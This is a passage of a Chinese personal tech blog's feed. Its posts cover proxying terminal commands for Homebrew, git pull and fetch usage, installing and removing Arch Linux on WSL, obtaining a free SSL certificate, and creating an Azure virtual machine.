href="https://www.aneasystone.com/archives/2015/08/git-clone-faster.html" target="_blank" rel="noopener">Git Clone 太慢怎么办？</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在使用git 时，需要克隆&lt;code&gt;Bitbucket&lt;/code&gt;的一个仓库，于是像往常一样打开了&lt;code&gt;iTerm&lt;/code</summary>
      
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    <category term="Skill" scheme="https://www.0x2beace.com/categories/Git/Skill/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
    <category term="Skill" scheme="https://www.0x2beace.com/tags/Skill/"/>
    
  </entry>
  
  <entry>
    <title>如何让终端命令走代理？</title>
    <link href="https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/"/>
    <id>https://www.0x2beace.com/how-to-make-terminal-commands-go-through-proxy/</id>
    <published>2020-08-18T15:39:58.000Z</published>
    <updated>2020-08-18T15:43:24.093Z</updated>
    
    <content type="html"><![CDATA[<p>问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完<code>brew updata</code> 之后，就一直是<code>Updating Homebrew...</code></p><a id="more"></a><p>这个时候，我产生了几个疑问：</p><ol><li>为什么卡着不动了，明明是有网络的啊。</li><li>难道是因为Homebrew 需要访问国外的源？</li><li>Shadowsocks 明明是开着全局代理，为什么没有用？</li><li>如何让终端命令走代理，或者说如何让 Homebrew 走代理更新？</li></ol><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>首先先回答一下上面那些问题，因为国内网络环境进一步恶劣，使得从根本上造成了这个问题的产生。因为<code>Shadowshocks</code>的全局代理虽然对浏览器是有效，但对命令行无效。</p><p>所以这一切的问题可以总结成一个问题：如果能让终端命令走代理就好了。</p><p>好在Homebrew 是支持全局代理的，所以我们只需要在当前环境中加入代理配置就好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1080 是本地 socks5 监听端口</span><br></pre></td></tr></table></figure><blockquote><p>如何知道终端命令有没有走代理？</p></blockquote><p>有一个很简单的方法，那就是通过Curl 命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure><p>如果走了本地代理，那么很快终端就会有输出，如果没有走则会提示403 端口请求超时。</p><h3 id="永久生效"><a href="#永久生效" class="headerlink" title="永久生效"></a>永久生效</h3><p>需要注意的是，上面的配置仅仅只是临时的，如果重启一下终端，这个配置就失效了，那么有没有办法可以永久生效呢？</p><p>当然是有的，只需要将环境变量写入终端中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># bash</span><br><span class="line">echo export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.bash_profile</span><br><span class="line"></span><br><span class="line"># zsh</span><br><span class="line">echo export ALL_PROXY&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080 &gt;&gt; ~&#x2F;.zsh_profile</span><br></pre></td></tr></table></figure><p>这样，Homebrew 就能通过 <code>Shadowsocks</code> 来更新了。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul><li><a href="https://www.logcg.com/archives/1617.html" target="_blank" rel="noopener">让 Homebrew 走代理更新</a></li><li><a href="https://www.cnblogs.com/xjnotxj/p/7478614.html" target="_blank" rel="noopener">如何让Homebrew 走代理更新？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;问题描述：今天本来打算使用Homebrew 更新一个工具，但是输入完&lt;code&gt;brew updata&lt;/code&gt; 之后，就一直是&lt;code&gt;Updating Homebrew...&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Git Pull 命令详解</title>
    <link href="https://www.0x2beace.com/detailed-git-pull-command/"/>
    <id>https://www.0x2beace.com/detailed-git-pull-command/</id>
    <published>2020-08-17T15:34:26.000Z</published>
    <updated>2020-08-17T15:36:38.472Z</updated>
    
    <content type="html"><![CDATA[<p>这片文章主要用来讲解<code>git pull</code>命令的一些细节。</p><a id="more"></a><h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><p>git pull 的作用是：取回远程主机某个分支的更新，再与本地指定分支自动合并。</p><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>将远程主机中的更改合并到当前分支，在默认情况下<code>git pull</code>是<code>git fetch</code>命令和<code>git merge Fetch_HEAD</code>命令的合集，后面会详细介绍。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>这是git pull 的完整格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull [options] [&lt;repository&gt; [&lt;refspec&gt;…]]</span><br></pre></td></tr></table></figure><p>比如要取回<code>origin</code>主机的<code>fixbug</code>分支的最新提交，<strong>并与本地的<code>master</code>分支合并</strong>，就需要写成这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin fixbug:master</span><br></pre></td></tr></table></figure><p>如果远程分支要与当前分支合并，则冒号及其冒号后的分支可以省略，就变成了这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 取回firebug 分支的最新提交并与当前分支合并</span><br><span class="line">$ git pull origin fixbug</span><br></pre></td></tr></table></figure><p>上面的命令表示，取回<code>origin/fixbug</code>分支最新的提交，并于当前分支合并。</p><p>这里就等同于先<code>git fetch</code>获取所跟踪的远程分支的最新的提交，然后执行<code>git merge</code>合并到当前分支。也就是下面两条命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 自动从当前分支的跟踪分支上获取最新的提交</span><br><span class="line">$ git fetch </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 合并origin&#x2F;fixbug分支到当前分支</span><br><span class="line">$ git merge origin&#x2F;fixbug</span><br></pre></td></tr></table></figure><h2 id="git-fetch"><a href="#git-fetch" class="headerlink" title="git fetch"></a>git fetch</h2><blockquote><p>为什么这个分支是这种写法?</p></blockquote><p>因为<code>git fetch</code>命令会获取当前追踪分支的最新更改，就等同于取回<code>origin/fixbug</code>分支到本地。</p><p>你可以使用<code>git branch -a</code> 查看所有分支，会发现多了一个 <code>origin/fixbug</code>分支，前提是该分支已经建立了追踪关系。</p><p>而这个分支所包含的内容就是最新的提交或者其他某些更改。所以此时你需要通过合并这个长的比较奇怪的分支，来更新本地的工作区。</p><p>在某些场合，Git 会自动在本地分支与远程分支之间建立一种追踪关系（tracking）。比如，我们在clone 时，会发现所有本地分支默认与远程主机的同名分支，建立追踪关系。也就是说，本地的 master 分支自动追踪 <code>origin/master</code>分支。</p><p>Git 也允许手动添加追踪关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 本地master分支与取回origin&#x2F;fixbug分支建立关系。</span><br><span class="line">$ git branch --set-upstream master origin&#x2F;fixbug</span><br></pre></td></tr></table></figure><p>如果当前分支与远程分支存在追踪关系。那么git pull 就可以省略远程分支名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin</span><br></pre></td></tr></table></figure><p>上面的分支是什么意思呢？就是表示本地的当前分支会自动与对应的<code>origin</code>主机的“追踪分支”进行合并。</p><p>如果当前分支只对应一种追踪分支，那么远程主机名都可以省略。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 这也就成了我们常看见的原始命令。</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure><p>上面的命令会自动的与唯一的追踪分支进行合并。</p><blockquote><p>如何将远程分支作为本地的默认分支？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git branch --track &lt;remote branch&gt; remotes&#x2F;origin&#x2F;&lt;remote branch&gt;</span><br></pre></td></tr></table></figure><p>这样就将远程的分支与本地同名分支建立了追踪关系。</p><p>可以使用<code>git config -e</code>命令查看。</p><p>当追踪关系只有一个时，那么使用<code>git pull</code> 命令，就可以直接更新<code>&lt;remote branch&gt;</code> 分支了。</p><p>如果合并需要采用<code>rebase</code>模式，可以使用<code>--rebase</code>选项。</p><h2 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h2><blockquote><p>这里说一个题外话，<code>rebase</code> 是什么？有什么用？</p></blockquote><p><code>git rebase</code> 清除本地历史提交</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git --rebase &lt;远程主机名&gt;&lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br></pre></td></tr></table></figure><blockquote><p>git fetch 与 git pull 的区别。</p></blockquote><p>git fetch 表示从远程获取最新的版本到本地，但是不会自动合并。其过程用命令表示就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin master</span><br><span class="line">$ git log -p master..origin&#x2F;master</span><br><span class="line">$ git merge origin&#x2F;master</span><br></pre></td></tr></table></figure><p>另一种写法就是：      </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git fetch origin master:tem</span><br><span class="line">$ git diff tem</span><br><span class="line">$ git merge tem</span><br></pre></td></tr></table></figure><p>上面这两种写法都是都是一个意思。唯一有所区别的就是使用 <code>tem</code>分支代替了<code>origin/master</code>分支的存在。其含义是： </p><ol><li>从远程<code>origin</code>主机的<code>master</code>主分支下载最新的版本到本地<code>origin/master</code>分支，或者<code>tem</code>分支。</li><li>比较本地master分支与origin/master（tem）分支的差异。</li><li>最后进行合并</li></ol><p>git pull，相当于从远程获取最新的版本并合并到本地。       </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure><p>上述命令其实相当于git fetch 和 git merge<br>在实际使用中，git fetch更安全一些，因为在merge前，我们可以查看更新情况，然后再决定是否合并。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这片文章主要用来讲解&lt;code&gt;git pull&lt;/code&gt;命令的一些细节。&lt;/p&gt;</summary>
    
    
    
    <category term="Git" scheme="https://www.0x2beace.com/categories/Git/"/>
    
    
    <category term="Git" scheme="https://www.0x2beace.com/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>Win10 如何卸载 Arch Linux</title>
    <link href="https://www.0x2beace.com/how-to-uninstall-wsl-linux-subsystem-in-win-10/"/>
    <id>https://www.0x2beace.com/how-to-uninstall-wsl-linux-subsystem-in-win-10/</id>
    <published>2020-08-16T09:56:22.000Z</published>
    <updated>2020-08-23T02:46:19.997Z</updated>
    
    <content type="html"><![CDATA[<p>最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。</p><a id="more"></a><p>在正式卸载之前，有以下几点需要注意：</p><ol><li>不要试图通过 Microsoft Store 去卸载，那里只有安装按钮，没有卸载按钮。</li><li>秋季创意者更新之前，可以使用<code>lxrun</code>命令去进行卸载操作，但是秋季创意者更新之后该命令就被移除了。</li></ol><h3 id="查看发行版"><a href="#查看发行版" class="headerlink" title="查看发行版"></a>查看发行版</h3><p>列出当前已经安装且随时可用的发行版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wslconfig &#x2F;list</span><br></pre></td></tr></table></figure><p>列出所有发行版，包括正在安装、卸载和已损坏的发行版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wslconfig &#x2F;list &#x2F;all</span><br></pre></td></tr></table></figure><h3 id="卸载"><a href="#卸载" class="headerlink" title="卸载"></a>卸载</h3><p>卸载已经安装的发行版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wslconfig &#x2F;list &#x2F;all</span><br><span class="line">Windows Subsystem for Linux Distributions:</span><br><span class="line">Arch (Default)</span><br><span class="line">$ wslconfig &#x2F;unregister Arch</span><br><span class="line">Unregistering...</span><br></pre></td></tr></table></figure><p>上面是以<code>Arch Linux</code>为例进行卸载，其他发行版同理，只需要替换发行版的名称就可以了。</p><blockquote><p>注意: 卸载发行版时，会永久删除所有与该发行版有关的数据和设置。</p></blockquote><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.littlelanmoe.com/exp/494" target="_blank" rel="noopener">Windows 10 Linux子系统如何卸载？</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在Windows 上安装 WSL，遇到一点问题，需要将 Arch Linux 完全卸载。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/categories/Linux/Windows/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Arch Linux" scheme="https://www.0x2beace.com/tags/Arch-Linux/"/>
    
  </entry>
  
  <entry>
    <title>Win10 如何安装 Arch Linux</title>
    <link href="https://www.0x2beace.com/how-to-install-arch-linux-on-win10/"/>
    <id>https://www.0x2beace.com/how-to-install-arch-linux-on-win10/</id>
    <published>2020-08-16T09:50:09.000Z</published>
    <updated>2020-08-16T10:00:10.873Z</updated>
    
    <content type="html"><![CDATA[<p>最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。</p><p>第一件需要做的事情就是配置开发环境。</p><a id="more"></a><h2 id="了解-WSL"><a href="#了解-WSL" class="headerlink" title="了解 WSL"></a>了解 WSL</h2><h3 id="什么是-WSL-？"><a href="#什么是-WSL-？" class="headerlink" title="什么是 WSL ？"></a>什么是 WSL ？</h3><p>Windows Linux Server (WSL) 又名Windows 子系统，它使得开发人员可以直接在未经修改得Windows 上运行 <code>Gun/Linux</code> 环境，也包括大多数命令行工具，实用程序员和应用程序员，而不会需要额外增加虚拟机。</p><h3 id="WSL-可以做什么"><a href="#WSL-可以做什么" class="headerlink" title="WSL 可以做什么"></a>WSL 可以做什么</h3><ul><li>你可以自行选择你喜欢的 <code>Gun/Linux</code> 发行版：Arch Linux、Ubuntu、OpenSuSE、Kail Linux、Debian、Fedora等。</li><li>运行通用的命令行，例如grep，sed，awk或其他ELF-64二进制文件。</li><li>轻松运行Bash Shell脚本和 <code>GNU/Linux</code> 命令行应用程序</li><li>使用自己的 <code>GNU/Linux</code> 分发程序包管理器安装其他软件。</li><li>使用类似Unix的命令行外壳调用Windows应用程序。</li><li>在Windows上调用 <code>GNU/Linux</code> 应用程序。</li></ul><p>有了这些功能，我们就可以完成很多工作，而不必担心安装虚拟机监控程序，从而享受Linux的好处。安装并准备好Win 10后，请按照以下步骤进行操作，并在其中添加Arch Linux。</p><h2 id="安装-WSL"><a href="#安装-WSL" class="headerlink" title="安装 WSL"></a>安装 WSL</h2><p>本文要安装的WSL 是 <a href="https://www.archlinux.org/" target="_blank" rel="noopener">Arch Linux</a> 。</p><blockquote><p>为什么要选择 Arch Linux？</p></blockquote><p>因为它是一个轻量级且灵活的Linux 发行版。</p><h3 id="为Linux-安装Windows-子系统"><a href="#为Linux-安装Windows-子系统" class="headerlink" title="为Linux 安装Windows 子系统"></a>为Linux 安装Windows 子系统</h3><p>这是一项使Windows能够“ 托管 ” Linux 的功能。所以需要先启用此功能。</p><p>以管理员的身份打开Power Shell，然后输入以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux</span><br></pre></td></tr></table></figure><p>通常会重启一次你的电脑。</p><h3 id="安装Arch-Linux"><a href="#安装Arch-Linux" class="headerlink" title="安装Arch Linux"></a>安装Arch Linux</h3><p>我记得在2019 年，Windows 刚拥抱 Linux 时，Arch Linux 还可以直接从 Microsoft Store 直接下载，不知为何现在却搜不到了。</p><p>不过还是有其他办法手动安装，<a href="https://github.com/yuk7/ArchWSL/releases/tag/20.4.3.0" target="_blank" rel="noopener">打开该页面</a>，下载<code>Arch.zip</code>。</p><p>解压完成之后，可以看到如下文件：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200816171455.png" alt=""></p><p>双击<code>Arch.exe</code>应用程序，进行安装。</p><p>稍微等待一会，就可以看到Arch Linux 已经顺利安装完成了，然后按任意键退出。</p><h3 id="启动Arch-Linux"><a href="#启动Arch-Linux" class="headerlink" title="启动Arch Linux"></a>启动Arch Linux</h3><p>再次双击<code>Arch Linux</code>，不出意外的话，就可以看到<code>Arch Linux</code> 的控制台了，没错就是这么简单。</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>第一次安装完成之后，需要手动做一些配置，初始化并更新系统。</p><p>在终端或<code>CMD</code> 中输入<code>WSL</code> 进入<code>Arch Linux</code>。</p><p>编辑 <code>/etc/pacman.d/mirrorlist</code>，去掉<code>China</code>节点 前面的<code>##</code>，以及下面的<code>Server</code>下面的<code>##</code>。</p><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pacman-key --init</span><br><span class="line"></span><br><span class="line">pacman-key --populate archlinux</span><br></pre></td></tr></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 更新 GPG key</span><br><span class="line">pacman -Sy archlinux-keyring</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 更新系统，速度快慢与镜像源有关</span><br><span class="line">pacman -Syyu base base-devel</span><br></pre></td></tr></table></figure><h2 id="个性化"><a href="#个性化" class="headerlink" title="个性化"></a>个性化</h2><p>Arch Linux 默认的样式并不好看，和CMD 都是黑漆漆的一片。</p><p>因为Arch Linux 默认使用的 Bash，如果你和我一样，更喜欢 Zsh 的话，那就请继续看下去。</p><h3 id="安装ZSH"><a href="#安装ZSH" class="headerlink" title="安装ZSH"></a>安装ZSH</h3><p>既然要安装Zsh，那就不得不安装<code>oh-my-zsh</code>了，所以这里一起安装了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S zsh oh-my-zsh-git</span><br></pre></td></tr></table></figure><h3 id="安装Spaceship-ZSH"><a href="#安装Spaceship-ZSH" class="headerlink" title="安装Spaceship ZSH"></a>安装Spaceship ZSH</h3><p><a href="https://github.com/denysdovhan/spaceship-prompt" target="_blank" rel="noopener">Spaceship ZSH</a> 是Zsh 的提示符工具。</p><ol><li><p>克隆仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;denysdovhan&#x2F;spaceship-prompt.git &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&quot;</span><br></pre></td></tr></table></figure></li><li><p>链接文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship-prompt&#x2F;spaceship.zsh&quot; &quot;$ZSH_CUSTOM&#x2F;themes&#x2F;spaceship.zsh-theme&quot;</span><br></pre></td></tr></table></figure></li><li><p>更改默认theme </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># vim ~&#x2F;.zshrc</span><br><span class="line">ZSH_THEME&#x3D;&quot;spaceship&quot;</span><br></pre></td></tr></table></figure></li></ol><p>重启终端即可。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://github.com/way-zer/way-zer.github.com/issues/2" target="_blank" rel="noopener">安装ArchWSL（Windows 下的Arch Linux 子系统）</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近主力生产工具可能要拿去送修，所以可能有一段时间要和我的MBP 分开了。但是工作还是要继续，于是把之前闲置的 小米 Pro 15.6 给整起来。&lt;/p&gt;
&lt;p&gt;第一件需要做的事情就是配置开发环境。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/categories/Linux/Windows/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
    <category term="Windows" scheme="https://www.0x2beace.com/tags/Windows/"/>
    
    <category term="WSL" scheme="https://www.0x2beace.com/tags/WSL/"/>
    
    <category term="Arch Linux" scheme="https://www.0x2beace.com/tags/Arch-Linux/"/>
    
  </entry>
  
  <entry>
    <title>如何申请免费的SSL 证书</title>
    <link href="https://www.0x2beace.com/how-to-apply-for-a-free-ssl-certificate/"/>
    <id>https://www.0x2beace.com/how-to-apply-for-a-free-ssl-certificate/</id>
    <published>2020-08-14T10:03:13.000Z</published>
    <updated>2020-12-21T03:43:39.608Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>像这类提供免费 SSL 证书的网站非常多，这里我选择的平台是 <a href="https://freessl.cn/" target="_blank" rel="noopener">FreeSSL.cn</a> 。</p><p>在正式开始之前，你得准备一个邮箱，<a href="https://freessl.cn/register" target="_blank" rel="noopener">注册</a> 一个 <code>FreeSSL.cn</code> 账号，然后登录。</p><p>将需要申请证书的域名填写在输入框中，选择多域名通配符，然后点击创建免费的SSL 证书。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814172918.png" alt=""></p><p>我这里选择的是泛域名，根据你自己的实际情况，去创建相应子域名的证书：</p><ul><li><code>example.com</code>：主域名</li><li><code>*.example.com</code>：泛域名</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814174731.png" alt=""></p><p>选择浏览器生成。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814175011.png" alt=""></p><p>点击确认创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814174930.png" alt=""></p><h3 id="添加TXT-记录"><a href="#添加TXT-记录" class="headerlink" title="添加TXT 记录"></a>添加TXT 记录</h3><p>打开需要申请 SSL 证书的域名管理后台，找到 DNS 管理。</p><p>添加 TXT 验证，将刚才的记录值与TXT 记录添加到对应的TXT 类型。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814180141.png" alt=""></p><p>注意⚠️：记录值区分大小写。</p><p>检测是否配置成功。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200814175520.png" alt=""></p><p>在完成验证之前不要离开当前页面，验证成功之后，点击验证。</p><p>如果配置成功没问题，就可以点击验证，下载证书就完成了。</p><p>注意⚠️：使用此方式获取的证书，有效期只有三个月。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这篇笔记用来记录如何申请免费的 SSL 证书，通过本文介绍的方式所申请的证书有效期只有三个月，请谨慎选择。&lt;/p&gt;</summary>
    
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Tutorial/"/>
    
    
    <category term="HTTPS" scheme="https://www.0x2beace.com/tags/HTTPS/"/>
    
    <category term="SSL" scheme="https://www.0x2beace.com/tags/SSL/"/>
    
    <category term="HTTP" scheme="https://www.0x2beace.com/tags/HTTP/"/>
    
  </entry>
  
  <entry>
    <title>手把手教你如何创建启动 Azure 实例</title>
    <link href="https://www.0x2beace.com/teach-you-how-to-create-and-start-an-azure-instance/"/>
    <id>https://www.0x2beace.com/teach-you-how-to-create-and-start-an-azure-instance/</id>
    <published>2020-08-12T15:49:19.000Z</published>
    <updated>2020-08-27T06:26:47.806Z</updated>
    
    <content type="html"><![CDATA[<p>这篇笔记用来整理如何创建启用 Azure 实例。因为这方面可以找到的资料比较少，所以整理一下。</p><p>一是方便自己以后回顾，二是给其他人作为参考。</p><a id="more"></a><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>因为本文是创建微软云，所以首先你得有一个微软账号。</p><p>打开 <a href="https://azure.microsoft.com/zh-cn/" target="_blank" rel="noopener">Microsoft Azure</a> 进行登录，登录成功之后，进入<a href="https://portal.azure.com/#home" target="_blank" rel="noopener">云服务管理后台</a>。</p><h2 id="创建实例"><a href="#创建实例" class="headerlink" title="创建实例"></a>创建实例</h2><p>点击创建资源。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812135350.png" alt=""></p><p>可以搜索你想创建的云服务类型，这里我选择的是 <code>Ubuntu Server 18.04 LTS</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812135625.png" alt=""></p><p>点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812135731.png" alt=""></p><p>放心，这里的创建并不是正真意义上的创建。接下来需要为机器预设配置。</p><p>下面对常见的配置进行简单说明：</p><ul><li><code>资源组</code>：用来分配一些权限以及策略。</li><li><code>虚拟机名称</code>：你希望用什么名称来称呼这台机器（通常是英文）</li><li><code>区域</code>：选择机器所在地区</li><li><code>映像</code>：选择操作系统</li><li><code>大小</code>：选择一个合适的负责类型，可以理解成机器的硬件配置。</li><li><code>身份验证类型</code>：通常有两种：ssh 密钥和密码，强烈建议使用密钥而不使用密码（密哦存在被暴力破解的风险）。</li><li><code>用户名</code>：微软云默认没有给<code>root</code> 用户，这里需要指定用户名称。</li><li><code>公共入站端口</code>：通常是只开启<code>HTTP (80)</code>、<code>HTTPS (443)</code>、<code>SSH (22)</code> 。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812141205.png" alt=""></p><p>完成基本配置之后，点击<code>下一步：磁盘</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812141834.png" alt=""></p><p>Azure 默认只有一个用于短期存储的临时盘，而临时盘通常都很小。</p><p>默认的磁盘很小，如果想扩大有两种方式：</p><ul><li>创建新的磁盘，需要手动挂载。</li><li>更改默认磁盘的大小。</li></ul><p>配置完磁盘之后，点击<code>下一步：网络</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812142034.png" alt=""></p><p>网络配置，公用ip 可以选择无，后面再去新建。</p><p>然后点击<code>下一步：管理</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812142317.png" alt=""></p><p>管理、高级、标记这一块，如果没有特殊需求可以直接使用默认配置。</p><p>最后点击<code>查看+创建</code>，可以看到预设的配置信息，如果符合预期，点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812142806.png" alt=""></p><p>下载私钥并保存好。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812152220.png" alt=""></p><p>此时，虽然已经创建好虚拟机，但是还不能直接使用，因为没有配置IP。</p><h2 id="关联IP"><a href="#关联IP" class="headerlink" title="关联IP"></a>关联IP</h2><p>Azure 和 AWS 不同，它并没有弹性IP 的概念，如果需要配置IP，需要在搜索栏中搜索<code>公共IP地址</code>，</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200812143323.png" alt=""></p><p>点击第一个搜索结果。</p><p><img 